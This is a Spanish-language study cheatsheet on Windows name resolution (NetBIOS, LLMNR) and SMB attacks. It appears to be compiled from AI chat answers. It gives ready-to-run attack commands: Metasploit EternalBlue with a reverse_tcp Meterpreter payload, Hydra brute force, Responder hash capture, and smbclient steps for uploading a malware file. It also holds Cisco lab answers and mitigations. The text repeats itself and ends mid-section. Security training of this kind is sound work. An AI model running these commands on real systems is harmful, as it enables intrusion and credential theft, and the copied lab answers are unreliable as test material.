# 🔥 CHEATSHEET COMPLETO: RESOLUCIÓN DE NOMBRES EN WINDOWS Y ATAQUES SMB

## 📌 1. CONCEPTOS FUNDAMENTALES

### ¿Qué es la resolución de nombres en Windows?
Es el proceso de convertir un nombre de equipo (ej: `\\IMPRESORA`) en una dirección IP para poder comunicarse en la red.

### Protocolos de resolución de nombres en Windows:

| Protocolo | Puerto | Descripción | Nivel de Seguridad |
|-----------|--------|-------------|-------------------|
| **NetBIOS-NS** | UDP 137 | Registro y resolución de nombres (16 caracteres) | ⚠️ BAJO (sin autenticación) |
| **NetBIOS-DGM** | UDP 138 | Comunicación sin conexión (datagramas) | ⚠️ BAJO |
| **NetBIOS-SSN** | TCP 139 | Comunicación orientada a conexión (sesión) | ⚠️ BAJO |
| **LLMNR** | UDP 5355 | Resolución de nombres en enlace local (multicast) | ⚠️ BAJO (sin autenticación) |
| **SMB** | TCP 445 | Compartir archivos e impresoras | 🔒 MEDIO/ALTO (depende configuración) |
| **DNS** | TCP/UDP 53 | Resolución jerárquica moderna | 🔒 ALTO (con DNSSEC) |

---

## 🎯 2. ATAQUES COMUNES

### A) Envenenamiento de LLMNR/NBT-NS (Suplantación de Identidad)

**¿Qué es?**
Un atacante responde a las consultas de resolución de nombres haciéndose pasar por un recurso legítimo (impresora, servidor, etc.)

**¿Cómo funciona?**

Usuario escribe: \PRINTER

Su PC pregunta: "¿Alguien sabe dónde está PRINTER?"

Atacante responde: "¡Yo soy PRINTER! Dame tu usuario y contraseña"

El PC confía ciegamente y envía las credenciales (hash NTLM)

El atacante captura el hash y lo descifra offline


**¿Por qué funciona?**
- NetBIOS y LLMNR NO tienen autenticación
- Windows confía en la primera respuesta que recibe
- Los hashes NTLM pueden descifrarse con fuerza bruta

**Herramientas del atacante:**
- `Responder` (la más popular)
- `NBNSpoof`
- `Metasploit`
- `Pupy` (malware avanzado)

---

### B) Explotación de SMB - EternalBlue (MS17-010)

**¿Qué es?**
Vulnerabilidad en SMBv1 que permite ejecutar código remoto sin autenticación.

**Impacto:**
- Usado por ransomware **WannaCry** y **Nyetya**
- Afecta a Windows 7, 8, 10, Server 2008, 2012, 2016

**En Metasploit:**
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 192.168.1.100   # Víctima
msf6 > set LHOST 192.168.1.50    # Atacante
msf6 > exploit

C) Ataque de Fuerza Bruta a SMB

¿Qué es?
Probar miles de combinaciones de usuario/contraseña contra un servidor SMB.

Herramientas:

    Hydra

    Medusa

    Ncrack

    Metasploit (auxiliary/scanner/smb/smb_login)

Ejemplo con Hydra:
bash

hydra -L usuarios.txt -P pass.txt 192.168.1.100 smb

3. HERRAMIENTAS DE ENUMERACIÓN SMB
A) Nmap - Escaneo de puertos SMB
bash

# Escaneo básico de puertos SMB
nmap -p 139,445 <IP>

# Escaneo de toda una red
nmap -p 139,445 192.168.1.0/24

# Escaneo Null (furtivo) - detecta puertos filtrados
nmap -sN <IP>

# Detectar vulnerabilidades SMB
nmap -p 445 --script smb-vuln-* <IP>

# Descubrir sistema operativo vía SMB
nmap -p 445 --script smb-os-discovery <IP>

# Enumerar recursos compartidos
nmap -p 445 --script smb-enum-shares <IP>

# Enumerar usuarios
nmap -p 445 --script smb-enum-users <IP>

B) enum4linux - Enumeración avanzada
bash

# Ver ayuda
enum4linux --help

# Enumerar usuarios
enum4linux -U <IP>

# Enumerar recursos compartidos
enum4linux -S <IP>

# Enumerar grupos y miembros
enum4linux -G <IP>

# Enumerar políticas de contraseñas
enum4linux -P <IP>

# Enumeración COMPLETA (todas las opciones)
enum4linux -a <IP>

# Modo detallado (muestra qué herramientas usa)
enum4linux -v <IP>

# Combinación: detallado + recursos compartidos
enum4linux -Sv <IP>

C) smbclient - Cliente SMB
bash

# Conectar a un recurso compartido
smbclient //<IP>/<recurso>

# Ejemplo: conectar a tmp sin contraseña
smbclient //172.17.0.2/tmp
Password for [WORKGROUP/kali]: (presionar Enter)

# Listar recursos compartidos
smbclient -L //<IP>/

# Comandos dentro de smbclient
smb: \> help          # Ver todos los comandos
smb: \> dir           # Listar archivos
smb: \> ls            # Listar archivos (igual que dir)
smb: \> cd <dir>      # Cambiar directorio
smb: \> get <remoto> <local>   # Descargar archivo
smb: \> put <local> <remoto>   # Subir archivo
smb: \> mkdir <nombre>         # Crear directorio
smb: \> rm <archivo>           # Eliminar archivo
smb: \> quit          # Salir

D) SearchSploit - Buscar exploits
bash

# Buscar exploits de SMB
searchsploit smb

# Buscar exploits específicos
searchsploit eternalblue

# Buscar por versión exacta
searchsploit "Windows 7"

# Ver el contenido de un exploit
searchsploit -x windows/remote/42031.py

4. INTERPRETACIÓN DE ESTADOS DE PUERTOS
Estado	Significado	¿Es atacable?	Acción recomendada
open	Puerto abierto y escuchando	✅ SÍ	Intentar enumeración
closed	Puerto cerrado (sin servicio)	❌ NO	Probar otro host
filtered	Firewall bloqueando el acceso	❌ NO	Intentar evasión o probar otro host
open|filtered	No se puede determinar	❓ Depende	Probar con otro escaneo
unfiltered	Accesible pero estado desconocido	❓ Depende	Probar conexión directa

5. INTERPRETACIÓN DE ERRORES COMUNES
Error	Causa	Significado	Solución
NT_STATUS_IO_TIMEOUT	Firewall bloquea o servidor no responde	El servidor IGNORA la conexión	Probar otro host / evadir firewall
Server doesn't allow session	No permite sesiones anónimas	Requiere autenticación	Usar credenciales válidas
Can't find workgroup/domain	NetBIOS deshabilitado	No responde a consultas NetBIOS	Probar con otro método
Connection refused	Puerto cerrado	El servicio no está corriendo	Verificar que el servicio esté activo
Name or service not known	IP incorrecta	No se resuelve el nombre	Verificar IP
NT_STATUS_ACCESS_DENIED	Credenciales incorrectas	Usuario/contraseña inválidos	Probar otras credenciales
NT_STATUS_BAD_NETWORK_NAME	Recurso compartido inexistente	El recurso no existe	Listar recursos con -L
🧠 6. EVALUACIÓN DE SEGURIDAD
Niveles de seguridad de un servidor SMB
Nivel	Características	Ejemplo
BAJO	Puertos open, sesiones nulas permitidas, sin firewall, contraseñas débiles	Windows 2000/XP sin parches
MEDIO	Firewall básico, pero permite sesiones anónimas o políticas débiles	Servidores mal configurados
ALTO	Puertos filtered, NO permite sesiones anónimas, NO responde a NetBIOS	Servidor del laboratorio (172.17.0.2) ✅
Indicadores de seguridad ALTA:

    ✅ Puertos filtered (firewall activo)

    ✅ Server doesn't allow session (no anónimo)

    ✅ Can't find workgroup/domain (no responde a NetBIOS)

    ✅ No se pueden enumerar políticas

    ✅ No se pueden enumerar usuarios

Indicadores de seguridad BAJA:

    ❌ Puertos open

    ❌ [+] Enumerating users... (información filtrada)

    ❌ Políticas de contraseñas débiles (longitud corta, sin complejidad)

    ❌ Password: (ninguna) (sesiones anónimas permitidas)

    ❌ Recursos compartidos accesibles sin credenciales

🎯 7. FLUJO DE TRABAJO EN PENTESTING SMB
text

1. ESCANEAR RED
   └── nmap -p 139,445 <IP>/24

2. IDENTIFICAR HOSTS CON PUERTOS ABIERTOS
   └── Buscar puertos en estado "open"

3. ENUMERAR CON ENUM4LINUX
   ├── enum4linux -U <IP>     (usuarios)
   ├── enum4linux -S <IP>     (recursos)
   ├── enum4linux -P <IP>     (políticas)
   └── enum4linux -a <IP>     (todo)

4. INTERPRETAR RESULTADOS
   ├── Si permite sesiones anónimas → ¡VULNERABLE!
   ├── Si NO permite sesiones anónimas → REQUIERE CREDENCIALES
   └── Si puertos FILTRADOS → FIREWALL PROTEGE

5. CONECTAR CON SMDCLIENT (si es vulnerable)
   ├── smbclient //<IP>/<recurso>
   ├── put <archivo> <archivo>   (subir archivo)
   └── quit                      (salir)

6. EXPLOTAR (si es vulnerable)
   └── Metasploit / EternalBlue / fuerza bruta

🔍 8. ENUMERACIÓN DETALLADA CON NMAP SCRIPTS
bash

# Enumeración completa de SMB
nmap -p 445 --script smb-* <IP>

# Scripts específicos útiles:
--script smb-os-discovery        # Descubrir sistema operativo
--script smb-enum-shares         # Recursos compartidos
--script smb-enum-users          # Usuarios
--script smb-enum-groups         # Grupos
--script smb-enum-domains        # Dominios
--script smb-vuln-*              # Vulnerabilidades
--script smb-security-mode       # Modo de seguridad
--script smb-protocols           # Protocolos SMB soportados
--script smb2-capabilities       # Capacidades SMB2
--script smb-mbenum              # Enumeración de estaciones
--script smb-print-text          # Impresoras
--script smb-server-stats        # Estadísticas del servidor
--script smb-system-info         # Información del sistema

🖥️ 9. EJEMPLOS PRÁCTICOS
Ejemplo 1: Servidor PROTEGIDO (como el laboratorio)
bash

# Escaneo
nmap -sN 172.17.0.2
→ 139/tcp filtered, 445/tcp filtered

# Enumeración
enum4linux -U 172.17.0.2
→ [E] Server doesn't allow session using username '', password ''
→ [E] Can't find workgroup/domain

# Conexión
smbclient //172.17.0.2/tmp
→ do_connect: Connection to 172.17.0.2 failed (Error NT_STATUS_IO_TIMEOUT)

# CONCLUSIÓN: SEGURIDAD ALTA - NO VULNERABLE

Ejemplo 2: Servidor VULNERABLE
bash

# Escaneo
nmap -p 139,445 10.6.6.23
→ 139/tcp open, 445/tcp open

# Enumeración
enum4linux -a 10.6.6.23
→ [+] Enumerating users...
→ [+] Share: homes, workfiles, print$
→ [+] Password policy: min=5, lockout=sin límite

# Conexión
smbclient //10.6.6.23/tmp
→ Password: (presionar Enter)
→ smb: \> dir
→ smb: \> put badfile.txt badfile.txt

# CONCLUSIÓN: SEGURIDAD BAJA - VULNERABLE

Ejemplo 3: Ataque EternalBlue con Metasploit
bash

# 1. Iniciar Metasploit
msfconsole

# 2. Cargar el exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Ver opciones
msf6 > show options

# 4. Configurar objetivos
msf6 > set RHOST 192.168.1.10   # Víctima
msf6 > set LHOST 192.168.1.20   # Atacante

# 5. Configurar payload (opcional)
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LPORT 4444

# 6. Ejecutar
msf6 > exploit

# 7. Si funciona, obtienes sesión:
[*] Meterpreter session 1 opened
meterpreter > sysinfo
meterpreter > getuid

🔑 10. VOCABULARIO CLAVE
Término	Significado
NetBIOS	Protocolo antiguo de resolución de nombres en Windows
LLMNR	Link-Local Multicast Name Resolution - resolución de nombres en enlace local
NBT-NS	NetBIOS Name Service - servicio de nombres NetBIOS
SMB	Server Message Block - protocolo para compartir archivos
RID	Relative Identifier - identificador relativo de usuario/grupo
SID	Security Identifier - identificador de seguridad único a nivel mundial
DC	Domain Controller - controlador de dominio
LDAP	Lightweight Directory Access Protocol - acceso a directorios
Workgroup	Grupo de equipos sin administración centralizada
Null Session	Conexión anónima sin credenciales
IPC$	Recurso compartido para comunicación entre procesos
filtered	Puerto bloqueado por firewall
open	Puerto accesible y con servicio
NT_STATUS_IO_TIMEOUT	Error de timeout - no hay respuesta
EternalBlue (MS17-010)	Vulnerabilidad crítica en SMBv1
NTLM	NT LAN Manager - protocolo de autenticación de Windows
🛡️ 11. MITIGACIONES Y BUENAS PRÁCTICAS
Medida	Explicación	Comando/Configuración
Deshabilitar LLMNR	Evita ataques de envenenamiento	Política de grupo o registro
Deshabilitar NetBIOS	Reduce superficie de ataque	Configuración de red avanzada
Bloquear puertos	Firewall perimetral	iptables -A INPUT -p tcp --dport 445 -j DROP
Deshabilitar SMBv1	Evita EternalBlue	Set-SmbServerConfiguration -EnableSMB1Protocol $false
Aplicar parches	Corregir vulnerabilidades	MS17-010 y posteriores
Políticas de contraseñas	Dificultar fuerza bruta	Longitud mínima 8, complejidad, bloqueo
Monitoreo	Detectar ataques	IDS/IPS, logs, SIEM
Autenticación fuerte	Evitar sesiones nulas	Requerir autenticación en SMB
📝 12. RESPUESTAS PARA EL LABORATORIO DE CISCO
Pregunta: "¿Qué utilidades de Samba utiliza enum4linux?"

Respuesta: rpcclient, net, nmblookup y smbclient.
Pregunta: "¿Qué revela Nmap sobre los hosts en 172.17.0.0/24?"

Respuesta: Solo hay un host con posibles puertos SMB: 172.17.0.2.
Pregunta: "¿Qué puertos están abiertos en el host?"

Respuesta: 139/tcp filtered netbios-ssn y 445/tcp filtered microsoft-ds (están filtrados, no abiertos).
Pregunta: "¿Cómo calificaría la seguridad de la política de contraseñas?"

Respuesta: ALTA. No permite tráfico, ni identificación de políticas de seguridad.
Pregunta: "¿Qué pasos seguiría para enviar un archivo de malware?"

Respuesta: 1. Escanear red con Nmap → 2. Enumerar con enum4linux → 3. Conectar con smbclient → 4. Usar put para subir el archivo.
Pregunta: "¿Qué error da smbclient y qué significa?"

Respuesta: NT_STATUS_IO_TIMEOUT - El servidor no respondió (firewall bloquea).
📌 13. REFLEXIÓN FINAL

    Un servidor con puertos FILTRADOS y que RECHAZA sesiones anónimas tiene un nivel de seguridad ALTO. No es vulnerable a enumeración SMB sin credenciales.

    Un servidor con puertos ABIERTOS y que PERMITE sesiones anónimas tiene un nivel de seguridad BAJO. Es vulnerable a enumeración y posible explotación.

    La resolución de nombres en Windows (NetBIOS/LLMNR) es un vector de ataque crítico porque NO tiene autenticación y permite suplantación de identidad.

📂 14. INSTALACIÓN DE HERRAMIENTAS
bash

# Instalar enum4linux
sudo apt-get install enum4linux

# Instalar smbclient
sudo apt-get install smbclient

# Instalar nmap
sudo apt-get install nmap

# Instalar SearchSploit
sudo apt-get install exploitdb

# Instalar Responder (para ataques LLMNR/NBT-NS)
git clone https://github.com/lgandx/Responder.git
cd Responder

🎯 15. EJEMPLO DE ANÁLISIS COMPLETO PARA INFORME
text

ANÁLISIS DE SEGURIDAD - HOST 172.17.0.2

RESULTADOS DEL ESCANEO:
- Puerto 139: filtered (bloqueado por firewall)
- Puerto 445: filtered (bloqueado por firewall)

RESULTADOS DE ENUM4LINUX:
- No se encontró grupo/dominio
- No permite sesiones anónimas
- No se puede enumerar políticas de seguridad

RESULTADOS DE SMDCLIENT:
- Error NT_STATUS_IO_TIMEOUT (no responde)

CONCLUSIÓN:
El servidor 172.17.0.2 tiene un nivel de seguridad ALTO.
No es vulnerable a enumeración SMB anónima.
No se puede transferir archivos sin credenciales válidas.

RECOMENDACIÓN:
- Probar con el otro objetivo (10.6.6.23) que debería ser vulnerable
- Si se necesitara acceso, buscar credenciales válidas o intentar evasión de firewall
- Considerar que el servidor está correctamente asegurado

¡Este cheatsheet cubre TODO el material sobre resolución de nombres en Windows y ataques SMB! Puedes guardarlo como windows-naming-smb-attacks.md en VS Code. 🚀

# 🪟 Resolución de Nombres en Windows y Ataques SMB

## 📌 Conceptos Clave
| Protocolo | Puerto | Uso |
|-----------|--------|-----|
| NetBIOS-NS | UDP 137 | Registro y resolución de nombres |
| NetBIOS-DGM | UDP 138 | Comunicación sin conexión |
| NetBIOS-SSN | TCP 139 | Comunicación con conexión |
| SMB | TCP 445 | Compartir archivos (Windows, Linux, Mac) |
| LLMNR | UDP 5355 | Resolución de nombres en enlace local |

---

## 🚨 Ataques Comunes

### Envenenamiento de LLMNR/NBT-NS
1. La víctima pregunta por un recurso (ej: "¿dónde está la impresora?")
2. El atacante responde: "¡yo soy la impresora!"
3. La víctima envía usuario + hash NTLMv2 al atacante
4. El atacante captura el hash y lo descifra offline

1. Usuario escribe: \\PRINTER (o hace clic en un recurso de red)
2. Su PC pregunta: "¿Alguien sabe dónde está PRINTER?"
3. Atacante responde: "¡Yo soy PRINTER! Dame tu usuario y contraseña"
4. El PC confía ciegamente y envía las credenciales (hash NTLM)
5. El atacante captura el hash y lo descifra offline

**Herramientas:**
```bash
responder -I eth0 -wrf
nbns_spoof.py
metasploit

EternalBlue (MS17-010)
Vulnerabilidad en SMBv1

Permite ejecutar código remoto sin autenticación

Usado por WannaCry y Nyetya

En Metasploit:

bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 192.168.1.100
msf6 > set LHOST 192.168.1.50
msf6 > exploit

🔍 Enumeración SMB
Con Nmap
bash
nmap -p 445 --script smb-os-discovery 192.168.1.0/24
nmap -p 445 --script smb-vuln-* 192.168.1.100

Con Enum4linux
bash
enum4linux -a 192.168.1.100

Con SearchSploit
bash
searchsploit smb
searchsploit eternalblue

🛡️ Mitigaciones
Acción	Explicación
Deshabilitar LLMNR	Política de grupo o registro
Deshabilitar NetBIOS	Configuración de red avanzada
Bloquear UDP 137, UDP 5355	Firewall perimetral
Monitorear registro	HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast → 0 = deshabilitado
Actualizar sistemas	Parches MS17-010 y posteriores

📦 Herramientas Útiles
Herramienta	Uso
Responder	Capturar hashes NTLMv2 via LLMNR/NBT-NS
Metasploit	Framework de exploits (EternalBlue, etc.)
Nmap	Escaneo de puertos y scripts SMB
Enum4linux	Enumeración de recursos SMB
SearchSploit	Buscar exploits en la base de datos

🧪 Ejemplo Rápido: EternalBlue con Metasploit
bash
# 1. Iniciar Metasploit
msfconsole

# 2. Cargar el exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Ver opciones
msf6 > show options

# 4. Configurar objetivos
msf6 > set RHOST 192.168.1.10   # Víctima
msf6 > set LHOST 192.168.1.20   # Atacante (Máquina Kali)

# 5. Ejecutar
msf6 > exploit

# Si funciona, obtienes sesión Meterpreter
⚠️ Notas Importantes
🧪 Solo usar en entornos autorizados (laboratorios, pentesting con permiso)

🔄 NetBIOS y LLMNR son protocolos obsoletos → deshabilitarlos cuando sea posible

🛡️ SMBv1 está deprecado → deshabilitarlo en todos los sistemas modernos

📋 Monitoreo continuo es clave para detectar envenenamiento de nombres

🔗 Recursos Útiles
SearchSploit

Metasploit Unleashed

Responder GitHub

text

---

## 🎯 Resumen Visual Rápido
📡 RESOLUCIÓN DE NOMBRES EN WINDOWS
│
├── 🔹 NetBIOS (UDP 137) → Nombres de 16 caracteres (viejo)
├── 🔹 LLMNR (UDP 5355) → Nombres en enlace local (moderno)
└── 🔹 DNS (TCP/UDP 53) → Resolución jerárquica (recomendado)

⚠️ ATAQUES
│
├── 🔸 Envenenamiento LLMNR/NBT-NS → Capturar hashes NTLM
│ └── Herramientas: Responder, NBNSpoof
│
└── 🔸 EternalBlue (MS17-010) → RCE en SMBv1
└── Herramientas: Metasploit, AutoBlue

🛡️ MITIGACIONES
│
├── 🔹 Deshabilitar LLMNR y NetBIOS
├── 🔹 Bloquear UDP 137 y UDP 5355
├── 🔹 Monitorear registro de Windows
└── 🔹 Aplicar parches de seguridad (MS17-010)

text

---

Con esto ya tienes una explicación clara y un cheatsheet listo para usar en VS Code. ¿Quieres que profundice en alguna parte en específico o necesitas algo más?


## 🎯 Envenenamiento LLMNR/NBT-NS = Suplantación de identidad en protocolos antiguos

### 🔹 ¿Qué es?
Un ataque donde el atacante responde a las consultas de resolución de nombres en Windows, haciéndose pasar por un recurso legítimo (impresora, servidor, etc.) para capturar hashes NTLM de contraseñas.

### 🔹 ¿Por qué funciona?
- NetBIOS y LLMNR NO tienen autenticación
- Windows confía en la primera respuesta que recibe
- Los hashes NTLM pueden descifrarse offline

### 🔹 Herramientas típicas
- Responder (la más común)
- NBNSpoof
- Metasploit

### 🔹 Mitigaciones
1. Deshabilitar LLMNR (GPO o registro)
2. Deshabilitar NetBIOS (configuración de red)
3. Bloquear UDP 137 y UDP 5355 en firewall
4. Usar DNS en lugar de NetBIOS/LLMNR
5. Implementar SMB con firma (evita manipulación)

### 🔹 Analogía
Es como un estafador que responde "yo soy el banco" cuando preguntas por teléfono, y tú le das tu contraseña porque confías en su voz.

# 🖥️ CHEATSHEET: CÓMO LEER LA TERMINAL EN CIBERSEGURIDAD

## 🔹 EL PROMPT (La línea donde escribes)
- `$` → Usuario normal (ej: `usuario@kali:~$`)
- `#` → Usuario root/administrador (ej: `root@kali:~#`)
- `>` → Estás dentro de un programa (ej: `msf6 >`, `mysql>`)
- `~` → Directorio home del usuario
- `C:\>` → Estás en Windows

## 🔹 ESTADOS QUE APARECEN EN LA SALIDA
- `[+]` → Éxito (ej: `[+] SMB OS: Windows 7`)
- `[-]` → Error (ej: `[-] Connection refused`)
- `[*]` → Información/Progreso (ej: `[*] Scanning ports...`)
- `[!]` → Advertencia (ej: `[!] Target is vulnerable`)
- `[?]` → Pregunta (requiere tu respuesta)

## 🔹 EXTENSIONES DE EXPLOITS
- `.py` → Python (ejecutar con: `python exploit.py`)
- `.rb` → Ruby (Metasploit lo usa)
- `.c` → C/C++ (requiere compilar con `gcc`)
- `.sh` → Bash (ejecutar en Linux)
- `.txt` → Solo documentación (NO es ejecutable)
- `.exe` → Ejecutable de Windows

## 🔹 PATHS DE EXPLOITS (Ejemplo: windows/remote/42031.py)
- `windows/` → Sistema operativo objetivo
- `remote/` → Tipo de ataque (remote=red, local=acceso físico, dos=saturación)
- `42031.py` → Número ID y extensión del archivo

## 🔹 COMANDOS DE METASPLOIT (msf)
- `use` → Cargar un exploit (ej: `use exploit/windows/smb/eternalblue`)
- `show options` → Ver qué configuraciones necesitas poner
- `set` → Asignar un valor (ej: `set RHOST 192.168.1.10`)
- `unset` → Borrar una configuración
- `exploit` o `run` → Ejecutar el ataque
- `search` → Buscar exploits (ej: `search eternalblue`)
- `back` → Volver al menú principal
- `exit` → Salir de Metasploit

## 🔹 VARIABLES DE METASPLOIT
- `RHOST` / `RHOSTS` → IP de la VÍCTIMA (target)
- `LHOST` → IP del ATACANTE (tu máquina)
- `RPORT` → Puerto de la VÍCTIMA
- `LPORT` → Puerto del ATACANTE
- `PAYLOAD` → Código que se ejecutará en la víctima
- `SMBUser` / `SMBPass` → Credenciales SMB (si se necesitan)

## 🔹 COMANDOS DE NMAP
- `nmap -p 445 <IP>` → Escanear solo el puerto SMB
- `nmap -p 445 --script smb-* <IP>` → Escanear con scripts SMB
- `nmap -p 445 --script smb-vuln-* <IP>` → Detectar vulnerabilidades SMB
- `nmap -p 445 --script smb-os-discovery <IP>` → Descubrir sistema operativo
- `nmap -p 445 192.168.1.0/24` → Escanear toda una red

## 🔹 COMANDOS DE ENUM4LINUX
- `enum4linux -a <IP>` → Enumeración COMPLETA (todo)
- `enum4linux -U <IP>` → Solo usuarios
- `enum4linux -S <IP>` → Solo recursos compartidos
- `enum4linux -o <IP>` → Solo información del sistema

## 🔹 COMANDOS DE SEARCHSPLOIT
- `searchsploit smb` → Buscar exploits relacionados con SMB
- `searchsploit eternalblue` → Buscar exploits específicos
- `searchsploit -x windows/remote/42031.py` → Ver el contenido del exploit

## 🔹 CÓMO INTERPRETAR UN ESCANEO DE NMAP
- `Host is up` → El equipo está encendido
- `445/tcp open` → Puerto SMB abierto y accesible
- `microsoft-ds` → Servicio: Microsoft Directory Services (SMB)
- `VULNERABLE` → El sistema TIENE la vulnerabilidad
- `CVE:CVE-2017-0143` → Identificador oficial de la vulnerabilidad
- `Risk factor: HIGH` → Nivel de riesgo (ALTO)

## 🔹 CÓMO INTERPRETAR UNA SESIÓN DE METERPRETER
- `meterpreter >` → Sesión abierta, tienes control del sistema
- `sysinfo` → Muestra información del sistema víctima
- `getuid` → Muestra el usuario con el que estás ejecutando comandos
- `shell` → Abre una terminal del sistema víctima (cmd en Windows, bash en Linux)
- `help` → Muestra todos los comandos disponibles

## 🔹 COMANDOS BÁSICOS UNA VEZ DENTRO DEL SISTEMA (Windows)
- `whoami` → Ver usuario actual
- `systeminfo` → Ver información completa del sistema
- `ipconfig /all` → Ver configuración de red
- `netstat -ano` → Ver puertos abiertos y conexiones
- `net user` → Ver todos los usuarios del sistema
- `net localgroup administrators` → Ver quiénes son administradores

## 🔹 COMANDOS BÁSICOS UNA VEZ DENTRO DEL SISTEMA (Linux)
- `whoami` → Ver usuario actual
- `id` → Ver usuario y grupos
- `uname -a` → Ver kernel y arquitectura
- `ifconfig` o `ip a` → Ver interfaces de red
- `netstat -tulpn` → Ver puertos abiertos
- `ps aux` → Ver procesos en ejecución

## 🔹 ERRORES COMUNES Y QUÉ SIGNIFICAN
- `Connection refused` → Puerto cerrado o firewall bloqueando
- `Permission denied` → No tienes permisos (usa `sudo`)
- `No route to host` → IP incorrecta o red inaccesible
- `Timeout` → El objetivo no responde (apagado o firewall)
- `Exploit failed` → El sistema está parcheado o no es vulnerable
- `Payload failed` → El payload es incompatible (ej: x64 vs x86)

## 🔹 CÓMO LEER UN EXPLOIT EN PYTHON (partes clave)
- `import` → Librerías que necesita
- `def exploit():` → Función principal del ataque
- `RHOST =` → IP de la víctima
- `RPORT =` → Puerto de la víctima
- `print("[-]")` → Muestra errores
- `print("[+]")` → Muestra éxitos
- `sys.exit()` → Termina el script

## 🔹 CÓMO LEER UN EXPLOIT EN C (partes clave)
- `#include` → Librerías que necesita
- `int main(int argc, char **argv)` → Función principal
- `socket()` → Crea una conexión de red
- `connect()` → Conecta a la víctima
- `send()` → Envía datos maliciosos
- `recv()` → Recibe datos del objetivo

## 🔹 DIFERENCIA ENTRE TIPOS DE ATAQUE
- `remote` → Se ejecuta desde la red (sin acceso físico)
- `local` → Requiere acceso físico al sistema
- `dos` → Satura el sistema (Denial of Service)
- `webapps` → Vulnerabilidad en aplicaciones web

## 🔹 CÓMO LEER UN LOG O TRACE DE ATAQUE
- `[*] Sending exploit...` → El exploit se está enviando
- `[+] Exploit sent successfully` → El exploit llegó al objetivo
- `[*] Waiting for payload...` → Esperando que se ejecute
- `[+] Session opened` → Sesión abierta (éxito total)

## 🔹 DÓNDE ESTÁ CADA COSA EN METASPLOIT
- `/usr/share/metasploit-framework/modules/exploits/` → Exploits
- `/usr/share/metasploit-framework/modules/auxiliary/` → Herramientas auxiliares
- `/usr/share/metasploit-framework/modules/payloads/` → Payloads
- `/usr/share/metasploit-framework/modules/post/` → Post-explotación

## 🔹 COMANDOS DE LINUX ÚTILES PARA PENTESTING
- `ping <IP>` → Ver si un host está vivo
- `traceroute <IP>` → Ver la ruta hasta el objetivo
- `nslookup <dominio>` → Resolución de nombres DNS
- `dig <dominio>` → Consulta DNS detallada
- `whois <dominio>` → Información de registro del dominio
- `curl -I <URL>` → Ver cabeceras HTTP de un sitio

## 🔹 EJEMPLO COMPLETO DE ATAQUE (paso a paso)